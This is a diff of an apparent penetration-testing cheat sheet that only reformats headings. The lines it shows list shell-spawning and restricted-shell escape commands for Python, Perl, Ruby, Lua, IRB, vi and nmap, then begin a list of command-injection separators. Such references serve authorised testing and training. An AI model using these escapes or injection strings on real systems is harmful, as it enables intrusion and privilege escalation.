@@ -800,7 +800,7 @@ do all in vm
 8) modify jumps to not take errors
 ```
 
-##Shell Spawning
+## Shell Spawning
 ```
 python -c 'import pty; pty.spawn("/bin/sh")'
 echo os.system('/bin/bash')
@@ -809,16 +809,22 @@ perl —e 'exec "/bin/sh";'
 perl: exec "/bin/sh";
 ruby: exec "/bin/sh"
 lua: os.execute('/bin/sh')
-(From within IRB)
+```
+## (From within IRB)
+```
 exec "/bin/sh"
 (From within vi)
 :!bash
-(From within vi)
+```
+## (From within vi)
+```
 :set shell=/bin/bash:shell
-(From within nmap)
+```
+## (From within nmap)
+```
 !sh
 ```
-##Command Injection
+## Command Injection
 ```
 ;
 &&
